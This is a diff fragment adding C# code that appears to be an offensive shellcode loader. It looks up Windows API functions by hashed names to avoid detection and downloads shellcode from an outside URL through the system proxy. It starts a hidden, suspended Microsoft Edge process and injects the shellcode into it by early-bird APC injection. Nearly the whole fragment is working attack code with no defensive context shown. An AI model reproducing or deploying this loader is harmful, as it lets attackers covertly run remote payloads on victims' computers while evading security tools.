+
+public IntPtr hStdError;
+
+}
+
+[StructLayout(LayoutKind.Sequential)]
+
+public struct PROCESS_INFORMATION
+
+{
+
+public IntPtr hProcess;
+
+public IntPtr hThread;
+
+public int dwProcessId;
+
+public int dwThreadId;
+
+}
+
+public Program()
+
+{
+
+byte[] shellcode;
+
+// hashes n shit
+
+uint checksum = 0xdeadc0de;
+
+var hk32 = Generic.GetLoadedModuleAddress("2F9A6973C69A1D8B3A51AB6A6D918AA8", checksum);
+
+var hCreateProcessW = Generic.GetExportAddress(hk32, "3D00AEB506FFD6D851CC51760FA39FD4", checksum);
+
+var hVallocEx = Generic.GetExportAddress(hk32, "F92B8426C2366E31B524B3B585F97E99", checksum);
+
+var hWriteProcessMemory = Generic.GetExportAddress(hk32, "1CD3F65BFB5E450D8543FE7B977B6C64", checksum);
+
+var hVirtualProtectEx = Generic.GetExportAddress(hk32, "0DF7A8E87D5CAEF515A030C2812ECFD3", checksum);
+
+var hResumeThread = Generic.GetExportAddress(hk32, "B539F6FB3A23C8109C6A886019B8D622", checksum);
+
+var hQueueUserAPC = Generic.GetExportAddress(hk32, "07D51485672E94A9B53FD02E19677BBF", checksum);
+
+var hCloseHandle = Generic.GetExportAddress(hk32, "99EE8FED21A16F8E8C66CD2097879D79", checksum);
+
+using (var client = new WebClient())
+
+{
+
+// make proxy aware
+
+client.Proxy = WebRequest.GetSystemWebProxy();
+
+client.UseDefaultCredentials = true;
+
+// set allowed tls versions
+
+ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;
+
+shellcode = client.DownloadData("https://www.infinity-bank.com/c");
+
+};
+
+var startup = new STARTUPINFO { dwFlags = 0x00000001 };
+
+var processInfo = new PROCESS_INFORMATION();
+
+startup.cb = Marshal.SizeOf(startup);
+
+object boxedProcessInfo = processInfo;
+
+object[] createProcessWParams =
+
+{
+
+@"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
+
+@"""C:\Program Files\(x86)\Microsoft\Edge\Application\msedge.exe --no-startup-window --win-session-start /prefetch:5""",
+
+IntPtr.Zero,
+
+IntPtr.Zero,
+
+false,
+
+CREATION_FLAGS.CREATE_NO_WINDOW | CREATION_FLAGS.CREATE_SUSPENDED,
+
+IntPtr.Zero,
+
+@"C:\Program Files (x86)\Microsoft\Edge\Application",
+
+startup,
+
+boxedProcessInfo
+
+};
+
+Generic.DynamicFunctionInvoke(
+
+hCreateProcessW,
+
+typeof(CreateProcessWDelegate),
+
+ref createProcessWParams
+
+);
+
+processInfo = (PROCESS_INFORMATION)createProcessWParams[9];
+
+object[] vallocExParams =
+
+{
+
+processInfo.hProcess,
+
+IntPtr.Zero,
+
+(uint)shellcode.Length,
+
+(uint)ALLOCATION_TYPE.MEM_COMMIT|(uint)ALLOCATION_TYPE.MEM_RESERVE,
+
+(uint)MEMORY_PROTECTION.PAGE_READWRITE
+
+};
+
+var baseAddress = (IntPtr)Generic.DynamicFunctionInvoke(
+
+hVallocEx,
+
+typeof(VirtualAllocExDelegate),
+
+ref vallocExParams
+
+);
+
+object[] wpmParameters =
+
+{
+
+processInfo.hProcess,
+
+baseAddress,
+
+shellcode,
+
+(uint)shellcode.Length,
+
+IntPtr.Zero
+
+};
+
+Generic.DynamicFunctionInvoke(
+
+hWriteProcessMemory,
+
+typeof(WriteProcessMemoryDelegate),
+
+ref wpmParameters
+
+);
+
+object[] vpExParameters =
+
+{
+
+processInfo.hProcess,
+
+baseAddress,
+
+(uint)shellcode.Length,
+
+(uint)MEMORY_PROTECTION.PAGE_EXECUTE_READ,
+
+0u
+
+};
+
+Generic.DynamicFunctionInvoke(
+
+hVirtualProtectEx,
+
+typeof(VirtualProtectExDelegate),
+
+ref vpExParameters
+
+);
+
+object[] qapcParameters =
+
+{
+
+baseAddress,
+
+processInfo.hThread,
+
+IntPtr.Zero
+
+};
+
+Generic.DynamicFunctionInvoke(
+
+hQueueUserAPC,
+
+typeof(QueueUserAPCDelegate),
+
+ref qapcParameters
+
+);
+
+object[] rthdParameters =
+
+{
+
+processInfo.hThread
+
+};
+
+Generic.DynamicFunctionInvoke(
+
+hResumeThread,
+
+typeof(ResumeThreadDelegate),
+
+ref rthdParameters
+
+);
+
+object[] closeParameters =
+
+{
+
+processInfo.hProcess
+
+};
+
+Generic.DynamicFunctionInvoke(
+
+hCloseHandle,
+
+typeof(CloseHandleDelegate),
+
+ref rthdParameters
+
+);
+
+Generic.DynamicFunctionInvoke(
+
+hCloseHandle,
+
+typeof(CloseHandleDelegate),
+
+ref closeParameters
+
+);
+
+}
+
+}
+
+}
+```
